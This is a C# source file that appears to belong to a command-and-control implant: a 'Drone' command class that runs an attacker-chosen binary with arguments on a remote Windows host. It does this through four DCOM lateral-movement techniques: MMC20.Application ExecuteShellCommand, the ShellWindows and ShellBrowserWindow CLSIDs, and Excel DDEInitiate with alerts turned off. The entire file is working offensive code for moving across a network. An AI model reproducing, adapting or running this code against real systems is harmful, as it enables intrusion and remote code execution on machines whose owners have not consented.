using System;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class DcomCommand : DroneCommand
{
    public override byte Command => 0x5F;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var target = task.Arguments["target"];
        var binary = task.Arguments["binary"];
        var method = task.Arguments["method"];

        if (!task.Arguments.TryGetValue("args", out var args))
            args = string.Empty;
        
        if (method.Equals("MMC20.Application", StringComparison.OrdinalIgnoreCase))
            Mmc20Application(target, binary, args);
        else if (method.Equals("ShellWindows", StringComparison.OrdinalIgnoreCase))
            ShellWindows(target, binary, args);
        else if (method.Equals("ShellBrowserWindow", StringComparison.OrdinalIgnoreCase))
            ShellBrowserWindow(target, binary, args);
        else if (method.Equals("ExcelDde", StringComparison.OrdinalIgnoreCase))
            ExcelDde(target, binary, args);
        else
            throw new ArgumentException("Unknown DCOM method");

        await Drone.SendTaskComplete(task.Id);
    }

    private static void Mmc20Application(string target, string binary, string args)
    {
        var type = Type.GetTypeFromProgID("MMC20.Application", target);
        var obj = Activator.CreateInstance(type);
        var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
        var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
        
        view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view,
            new object[] { binary, null, args, "7" });
    }

    private static void ShellWindows(string target, string binary, string args)
    {
        var type = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
        var obj = Activator.CreateInstance(type);
        var item = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, null);
        var doc = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
        var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
        
        app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
            new object[] { binary, args, @"C:\Windows\System32", null, 0 });
    }

    private static void ShellBrowserWindow(string target, string binary, string args)
    {
        var type = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
        var obj = Activator.CreateInstance(type);
        var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
        var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
        
        app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
            new object[] { binary, args, @"C:\Windows\System32", null, 0 });
    }

    private static void ExcelDde(string target, string binary, string args)
    {
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
        obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, args });
    }
}